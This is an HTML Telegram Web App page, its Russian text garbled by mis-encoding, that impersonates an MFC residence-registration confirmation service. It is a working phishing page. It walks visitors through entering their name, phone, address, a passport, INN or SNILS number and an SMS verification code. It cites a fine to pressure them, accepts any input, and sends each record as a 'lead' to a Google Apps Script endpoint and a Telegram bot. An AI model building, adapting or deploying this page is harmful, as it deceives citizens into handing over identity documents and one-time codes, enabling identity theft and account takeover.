<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>–ú–§–¶ ‚Äî –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --primary-color: #800000;
      --secondary-color: #660000;
      --info-color: #990000;
      --error-color: #B22222;
      --background-color: #F5E6E6;
      --white: #fff;
      --text-color: #333;
      --shadow: 0 4px 12px rgba(128,0,0,.3);
      --input-bg: #EADADA;
      --input-border: #990000;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: var(--background-color);
      padding: 20px; display: flex; justify-content: center; min-height: 100vh;
    }
    .container { max-width: 520px; width: 100%; background: var(--white); padding: 30px; border-radius: 16px; box-shadow: var(--shadow); text-align: center; }
    .step { display: none; text-align: left; }
    .step.active { display: block; }
    h2, h3 { margin-bottom: 20px; font-weight: 700; font-size: 1.6em; color: var(--primary-color); display: flex; align-items: center; gap: 10px; line-height: 1.3; }
    p { margin-bottom: 14px; }
    .input-group { margin-bottom: 20px; text-align: left; display: flex; flex-direction: column; }
    input {
      width: 100%; padding: 12px 15px; margin-top: 8px;
      border: 2px solid var(--input-border); border-radius: 10px; font-size: 16px;
      background: var(--input-bg); box-shadow: 0 2px 6px rgba(0,0,0,.1);
      transition: border-color .3s, box-shadow .3s;
    }
    input:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 4px 12px rgba(128,0,0,.2); }
    .error { color: var(--error-color); font-size: 14px; margin-top: 6px; font-weight: 600; text-align: left; min-height: 1.2em; }
    .buttons { margin-top: 20px; display: flex; flex-direction: column; gap: 12px; }
    button {
      width: 100%; padding: 14px; border: none; border-radius: 10px; cursor: pointer;
      font-size: 16px; font-weight: 600; transition: background-color .3s, transform .1s;
      text-align: center; color: var(--white); user-select: none;
    }
    button:hover { transform: translateY(-2px); }
    button:disabled { background: #ccc; cursor: not-allowed; }
    .next { background: var(--primary-color); }
    .back { background: var(--secondary-color); }
    .menu-btn { background: var(--info-color); }
    .loading { display: none; color: var(--primary-color); font-size: 14px; margin-top: 10px; }
  </style>
</head>
<body>
  <div class="container">
    <div id="wizard">
      <div class="step active" id="step-main">
        <h2 id="welcome-message">üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, üëã</h2>
        <p>–ì–æ—Ç–æ–≤—ã –Ω–∞—á–∞—Ç—å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ –º–µ—Å—Ç—É –∂–∏—Ç–µ–ª—å—Å—Ç–≤–∞?</p>
        <div class="buttons">
          <button type="button" class="menu-btn" data-action="schedule">üìã –ó–∞–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –ø—Ä–∏—ë–º</button>
          <button type="button" class="menu-btn" data-action="documents">üìú –°–ø–∏—Å–æ–∫ –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤</button>
          <button type="button" class="menu-btn" data-action="check-status">üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∑–∞—è–≤–∫–∏</button>
          <button type="button" class="menu-btn" data-action="contact">üìû –°–≤—è–∑–∞—Ç—å—Å—è —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π</button>
          <button type="button" class="menu-btn" data-action="faq">‚ùì –ß–∞—Å—Ç—ã–µ –≤–æ–ø—Ä–æ—Å—ã</button>
        </div>
      </div>

      <div class="step" id="step-fullname">
        <h3>üë§ –£–∫–∞–∂–∏—Ç–µ –§–ò–û</h3>
        <div class="input-group">
          <input type="text" id="fullname" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" autocomplete="name">
          <div class="error" id="err-fullname"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-phone">
        <h3>üìû –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h3>
        <div class="input-group">
          <input type="tel" id="phone" placeholder="+7 (999) 123-45-67" inputmode="tel" autocomplete="tel">
          <div class="error" id="err-phone"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-address">
        <h3>üè† –£–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å</h3>
        <div class="input-group">
          <input type="text" id="address" placeholder="–≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1, –∫–≤. 2" autocomplete="address-line1">
          <div class="error" id="err-address"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-document-type">
        <h3>üìÑ –í—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç</h3>
        <div class="buttons">
          <button type="button" class="menu-btn" data-doc="–ü–∞—Å–ø–æ—Ä—Ç">üìÑ –ü–∞—Å–ø–æ—Ä—Ç</button>
          <button type="button" class="menu-btn" data-doc="–ò–ù–ù">üßæ –ò–ù–ù</button>
          <button type="button" class="menu-btn" data-doc="–°–ù–ò–õ–°">üü¢ –°–ù–ò–õ–°</button>
        </div>
        <div class="buttons"><button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button></div>
      </div>

      <div class="step" id="step-document-number">
        <h3 id="doc-title">üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞</h3>
        <div class="input-group">
          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
          <input type="text" id="docnumber" placeholder="4510123456">
          <div class="error" id="err-doc"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –î–∞–ª–µ–µ</button>
        </div>
      </div>

      <div class="step" id="step-code">
        <h3>üîê –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS</h3>
        <div class="input-group">
          <input type="text" id="code" placeholder="1234" inputmode="numeric" pattern="\d*">
          <div class="error" id="err-code"></div>
        </div>
        <div class="buttons">
          <button type="button" class="back">‚Ü©Ô∏è –í–µ—Ä–Ω—É—Ç—å—Å—è –Ω–∞–∑–∞–¥</button>
          <button type="button" class="next">‚û°Ô∏è –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
          <div class="loading" id="loading">–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    let __lastSent = "";
    function sendToBotOnce(rec) {
      const tg = window.Telegram?.WebApp;
      const loading = document.getElementById("loading");
      if (loading) loading.style.display = "block";
      if (!tg) {
        console.log("Telegram WebApp not available, showing preview");
        alert("–ü—Ä–µ–≤—å—é –¥–∞–Ω–Ω—ã—Ö (–≤–Ω–µ Telegram):\n" + JSON.stringify(rec, null, 2));
        if (loading) loading.style.display = "none";
        return;
      }
      try {
        const json = JSON.stringify({ type: "lead", payload: rec });
        if (json === __lastSent) { if (loading) loading.style.display = "none"; return; }
        tg.ready();
        tg.sendData(json);
        tg.HapticFeedback?.impactOccurred?.("light");
        __lastSent = json;
        if (loading) loading.style.display = "none";
      } catch (e) {
        console.error("sendData error:", e);
        alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ –±–æ—Ç–∞.");
        if (loading) loading.style.display = "none";
      }
    }

    function formatPhone(input) {
      let value = input.value.replace(/\D/g, '');
      if (value.length > 0 && value[0] !== '7') value = '7' + value;
      value = value.substring(0, 11);
      let formatted = '+7';
      if (value.length > 1) formatted += ' (' + value.substring(1, 4);
      if (value.length > 4) formatted += ') ' + value.substring(4, 7);
      if (value.length > 7) formatted += '-' + value.substring(7, 9);
      if (value.length > 9) formatted += '-' + value.substring(9, 11);
      input.value = formatted;
    }

    class MFCWizard {
      constructor() {
        this.steps = document.querySelectorAll(".step");
        this.currentStep = "main";
        this.formData = {};
        this.initEvents();
        this.updateWelcome();
        this.show("main");
      }

      initEvents() {
        const root = document.getElementById("wizard");
        root.addEventListener("click", (e) => {
          const t = e.target.closest("button");
          if (!t) return;
          if (t.classList.contains("next")) this.next();
          else if (t.classList.contains("back")) this.back();
          else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);
        });
        ["fullname", "phone", "address", "docnumber", "code"].forEach((id) => {
          const el = document.getElementById(id);
          if (el) {
            el.addEventListener("input", () => this.validate(this.currentStep)); // –ø–æ–¥—Å–∫–∞–∑–∫–∏ —Å—Ä–∞–∑—É
            el.addEventListener("keypress", (e) => { if (e.key === "Enter") { e.preventDefault(); this.next(); } });
            if (id === "phone") el.addEventListener("input", () => formatPhone(el));
          }
        });
      }

      updateWelcome() {
        const el = document.getElementById("welcome-message");
        const tg = window.Telegram?.WebApp;
        let name = "–ì–æ—Å—Ç—å";
        try {
          const u = tg?.initDataUnsafe?.user;
          if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "–ì–æ—Å—Ç—å";
        } catch {}
        el.textContent = `üìã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, ${name}! üëã`;
      }

      show(id) {
        this.steps.forEach((s) => s.classList.toggle("active", s.id === `step-${id}`));
        this.currentStep = id;
        ["err-fullname", "err-phone", "err-address", "err-doc", "err-code"].forEach((eid) => {
          const el = document.getElementById(eid); if (el) el.textContent = "";
        });
        window.scrollTo({ top: 0, behavior: "smooth" });
        const input = document.querySelector(`#step-${id} input`); if (input) input.focus();
      }

      next() {
        // –í–∞–ª–∏–¥–∞—Ü–∏—è –≤—Å–µ–≥–¥–∞ –æ—Ç—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç, –Ω–æ –ù–ï –±–ª–æ–∫–∏—Ä—É–µ—Ç –ø–µ—Ä–µ—Ö–æ–¥
        this.validate(this.currentStep);
        if (this.currentStep === "fullname") { this.formData.fullname = (document.getElementById("fullname").value || "").trim(); return this.show("phone"); }
        if (this.currentStep === "phone") {
          const raw = (document.getElementById("phone").value || "").trim();
          this.formData.phone_raw = raw; // –∫–∞–∫ –≤–≤—ë–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
          return this.show("address");
        }
        if (this.currentStep === "address") { this.formData.address = (document.getElementById("address").value || "").trim(); return this.show("document-type"); }
        if (this.currentStep === "document-number") { this.formData.doc_number = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); }
        if (this.currentStep === "code") { this.formData.code = (document.getElementById("code").value || "").trim(); return this.send(); }
      }

      back() {
        const map = { fullname: "main", phone: "fullname", address: "phone", "document-type": "address", "document-number": "document-type", code: "document-number" };
        this.show(map[this.currentStep] || "main");
      }

      menu(action, doc) {
        if (action === "schedule") return this.show("fullname");
        if (action === "documents") {
          const documents = "üìã –î–æ–∫—É–º–µ–Ω—Ç—ã –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏:\nüõÇ –ü–∞—Å–ø–æ—Ä—Ç\nüìÑ –í—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù\nüè† –î–ª—è –º—É–Ω–∏—Ü–∏–ø–∞–ª—å–Ω–æ–≥–æ –∂–∏–ª—å—è: –¥–æ–≥–æ–≤–æ—Ä –Ω–∞–π–º–∞ –∏ —Å–æ–≥–ª–∞—Å–∏–µ –∂–∏–ª—å—Ü–æ–≤";
          alert(documents);
        }
        if (action === "check-status") {
          const statusPrompt = prompt("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∑–∞—è–≤–∫–∏ –∏–ª–∏ –¥–∞–Ω–Ω—ã–µ –ø–∞—Å–ø–æ—Ä—Ç–∞:");
          if (statusPrompt) alert("‚ùå –î–∞–Ω–Ω—ã–µ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –ü—Ä–æ–π–¥–∏—Ç–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é.");
          else this.show("main");
        }
        if (action === "contact") { try { window.location.href = "https://t.me/MFC_SUPPORT"; } catch { alert("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ."); } }
        if (action === "faq") {
          const faqOptions = [
            "1) –ó–∞—á–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é? ‚Äî –î–ª—è –∞–∫—Ç—É–∞–ª–∏–∑–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö –≤ –ï–ì–†–ù.",
            "2) –ö–∞–∫–∏–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã? ‚Äî –ü–∞—Å–ø–æ—Ä—Ç, –≤—ã–ø–∏—Å–∫–∞ –ï–ì–†–ù, –¥–ª—è –º—É–Ω–∏—Ü–∏–ø–∞–ª—å–Ω–æ–≥–æ –∂–∏–ª—å—è ‚Äî –¥–æ–≥–æ–≤–æ—Ä –Ω–∞–π–º–∞.",
            "3) –ï—Å–ª–∏ –Ω–µ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å? ‚Äî –®—Ç—Ä–∞—Ñ 2000‚Äì5000 —Ä—É–±. (—Å—Ç. 19.15.1 –ö–æ–ê–ü –†–§).",
            "4) –û–Ω–ª–∞–π–Ω? ‚Äî –ß–∞—Å—Ç–∏—á–Ω–æ —á–µ—Ä–µ–∑ –ì–æ—Å—É—Å–ª—É–≥–∏, –≤–∏–∑–∏—Ç –≤ –ú–§–¶ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω.",
            "5) –ö–∞–∫ –∏–∑–º–µ–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ? ‚Äî –ü–µ—Ä–µ—Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∑–∞ 30 –¥–Ω–µ–π —á–µ—Ä–µ–∑ –ú–§–¶."
          ];
          const idx = prompt("–í—ã–±–µ—Ä–∏—Ç–µ –≤–æ–ø—Ä–æ—Å (1-5):\n" + faqOptions.join("\n"));
          if (idx) alert(faqOptions[parseInt(idx) - 1] || "–í—ã–±–µ—Ä–∏—Ç–µ –Ω–æ–º–µ—Ä –∏–∑ —Å–ø–∏—Å–∫–∞!");
          else this.show("main");
        }
        if (doc) {
          this.formData.doc_type = doc; // –∑–∞–ø–æ–º–∏–Ω–∞–µ–º —Ç–∏–ø –¥–æ–∫—É–º–µ–Ω—Ç–∞
          const ex = { –ü–∞—Å–ø–æ—Ä—Ç: "–ü—Ä–∏–º–µ—Ä: 4510123456", –ò–ù–ù: "–ü—Ä–∏–º–µ—Ä: 500100732259", –°–ù–ò–õ–°: "–ü—Ä–∏–º–µ—Ä: 112-233-445 95" };
          const docExample = document.getElementById("doc-example"); if (docExample) docExample.textContent = ex[doc] || "";
          const docTitle = document.getElementById("doc-title"); if (docTitle) docTitle.textContent = `üî¢ –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ (${doc})`;
          return this.show("document-number");
        }
      }

      // –ú–Ø–ì–ö–ê–Ø –í–ê–õ–ò–î–ê–¶–ò–Ø (–ø–æ–¥—Å–∫–∞–∑–∫–∏, –Ω–æ –Ω–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç)
      validate(step) {
        const e = (id) => document.getElementById(id);
        const get = (id) => (document.getElementById(id)?.value || "").trim();
        ["err-fullname","err-phone","err-address","err-doc","err-code"].forEach(id => { const n=e(id); if (n) n.textContent=""; });
        const warn = (id, msg) => { const n=e(id); if (n) n.textContent = msg; };

        if (step === "fullname") {
          const v = get("fullname");
          if (!/^[–ê-–Ø–Å–∞-—è—ë][–ê-–Ø–Å–∞-—è—ë\-]+(\s+[–ê-–Ø–Å–∞-—è—ë][–ê-–Ø–Å–∞-—è—ë\-]+)+$/.test(v)) {
            warn("err-fullname","–£–∫–∞–∂–∏—Ç–µ –§–ò–û –∫–∏—Ä–∏–ª–ª–∏—Ü–µ–π: –º–∏–Ω–∏–º—É–º –∏–º—è –∏ —Ñ–∞–º–∏–ª–∏—è.");
          }
          this.formData.fullname = v; return true;
        }
        if (step === "phone") {
          const v = get("phone"), d=v.replace(/\D/g,"");
          if (d.length < 10) warn("err-phone","–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–∂–µ–ª–∞—Ç–µ–ª—å–Ω–æ +7 –∏ 10 —Ü–∏—Ñ—Ä –ø–æ—Å–ª–µ).");
          return true;
        }
        if (step === "address") {
          const v = get("address");
          if (v.length < 5) warn("err-address","–£–∫–∞–∂–∏—Ç–µ –∞–¥—Ä–µ—Å (–Ω–∞–ø—Ä–∏–º–µ—Ä: –≥. –ú–æ—Å–∫–≤–∞, —É–ª. –õ–µ–Ω–∏–Ω–∞, –¥. 1).");
          this.formData.address = v; return true;
        }
        if (step === "document-number") {
          const type = this.formData.doc_type || "";
          const raw = get("docnumber");
          const d = raw.replace(/\D/g,"");
          if (type === "–ü–∞—Å–ø–æ—Ä—Ç" && d.length !== 10) warn("err-doc","–ü–∞—Å–ø–æ—Ä—Ç –æ–±—ã—á–Ω–æ 10 —Ü–∏—Ñ—Ä, –Ω–æ –ø—Ä–æ–ø—É—Å–∫–∞—é –¥–∞–ª–µ–µ.");
          if (type === "–ò–ù–ù" && d.length !== 12) warn("err-doc","–ò–ù–ù –æ–±—ã—á–Ω–æ 12 —Ü–∏—Ñ—Ä, –Ω–æ –ø—Ä–æ–ø—É—Å–∫–∞—é –¥–∞–ª–µ–µ.");
          if (type === "–°–ù–ò–õ–°" && !/^\d{3}-?\d{3}-?\d{3}\s?\d{2}$/.test(raw)) warn("err-doc","–°–ù–ò–õ–° —Ñ–æ—Ä–º–∞—Ç XXX-XXX-XXX XX, –Ω–æ –ø—Ä–æ–ø—É—Å–∫–∞—é –¥–∞–ª–µ–µ.");
          this.formData.doc_number = raw.trim();
          this.formData.doc_number_digits = d;
          return true;
        }
        if (step === "code") {
          const v = get("code");
          if (v && !/^\d{4}$/.test(v)) warn("err-code","–ö–æ–¥ –æ–±—ã—á–Ω–æ 4 —Ü–∏—Ñ—Ä—ã, –Ω–æ –º–æ–∂–Ω–æ –æ—Å—Ç–∞–≤–∏—Ç—å –∫–∞–∫ –µ—Å—Ç—å.");
          this.formData.code = v; return true;
        }
        return true;
      }

      async send() {
        // —Ç–µ–ª–µ—Ñ–æ–Ω –≤ —Ç–∞–±–ª–∏—Ü—É ‚Äî –¢–û–õ–¨–ö–û –¶–ò–§–†–´
        const phoneDigits = String(this.formData.phone_raw || "").replace(/\D/g, "");

        const rec = {
          timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
          fullname: this.formData.fullname || "",
          phone: phoneDigits,                   // ‚Üê —Å—é–¥–∞ —É–π–¥—ë—Ç –±–µ–∑ "+" –∏ –ø—Ä–æ—á–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤
          address: this.formData.address || "",
          doc_type: this.formData.doc_type || "",
          doc_number: String(this.formData.doc_number || ""),
          doc_number_digits: String(this.formData.doc_number_digits || ""),
          document: `${this.formData.doc_type || ""} ${this.formData.doc_number || ""}`.trim(),
          code: String(this.formData.code || "")
        };

        try { await sendToSheet(rec); } catch (err) { console.warn("sendToSheet error:", err); }
        sendToBotOnce(rec);

        this.formData = {};
        this.show("main");
        alert("–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!");
      }
    }

    try { new MFCWizard(); }
    catch (e) { console.error("Failed to initialize MFCWizard:", e); alert("–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏. –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É."); }
  </script>

  <!-- –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Google Sheets (Apps Script) -->
  <script>
    // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–∏ –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏
    const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbw--mkX6tEFl5MlEZNGj2Ptp0u3-dQxCxkgIQm3VwAun8O4XNW7KynUAJdFSVRjlVg/exec";
    const SECRET = "benhillworkspeisworkhab";

    async function sendToSheet(rec) {
      // –í—Å–µ –∫–ª—é—á–µ–≤—ã–µ –ø–æ–ª—è ‚Äî —Å—Ç—Ä–æ–∫–∞–º–∏
      const safe = Object.fromEntries(Object.entries(rec).map(([k,v]) => [k, (v==null? "": String(v))]));
      const payload = JSON.stringify({ type: "lead", payload: safe, secret: SECRET });

      const loading = document.getElementById("loading");
      if (loading) loading.style.display = "block";
      try {
        const res = await fetch(SHEETS_WEBAPP_URL, {
          method: "POST",
          headers: { "Content-Type": "text/plain;charset=utf-8" }, // text/plain ‚Äî –º–µ–Ω—å—à–µ preflight/CORS
          body: payload
        });
        const text = await res.text();
        let data = {}; try { data = JSON.parse(text); } catch {}
        if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
      } catch (err) {
        console.warn("sendToSheet error:", err);
        alert("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤ —Ç–∞–±–ª–∏—Ü—É: " + err.message);
      } finally {
        if (loading) loading.style.display = "none";
      }
    }
  </script>
</body>
</html>
